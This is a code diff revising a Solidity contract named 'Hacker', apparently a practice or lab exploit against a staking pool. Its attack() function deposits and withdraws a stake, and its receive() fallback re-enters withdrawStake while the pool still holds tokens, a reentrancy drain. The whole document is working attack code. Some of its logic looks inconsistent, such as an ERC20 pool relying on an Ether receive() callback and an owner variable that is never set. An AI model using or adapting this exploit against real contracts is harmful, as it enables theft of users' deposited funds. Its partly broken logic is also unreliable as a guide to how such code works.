@@ -9,25 +9,25 @@ pragma solidity ^0.8.0;
  }
 
  contract Hacker{
-    uint256 amount=1 ether;
+    uint256 amount=10 ** 18;
+    address public owner;
     IERC20 public token;
     IStakingPool public immutable poolContract;
+    address poolContractAddress;
     constructor(address _poolContract,address _tokenAddress){
         token=IERC20(_tokenAddress);
         poolContract=IStakingPool(_poolContract);
+        poolContractAddress=_poolContract;
     }
     function attack()external {
+        token.approve(poolContractAddress,amount);
         poolContract.depositStake(amount);
         poolContract.withdrawStake(amount,1);
-        token._mint(address(this),50 * 10 ** 18);
     }
     
     receive()external payable{
         if(token.balanceOf(address(poolContract))>0){
          poolContract.withdrawStake(amount,1);
         }   
-        else{
-            payable(owner()).transfer(address(this).balance);
-        }
     }
  }
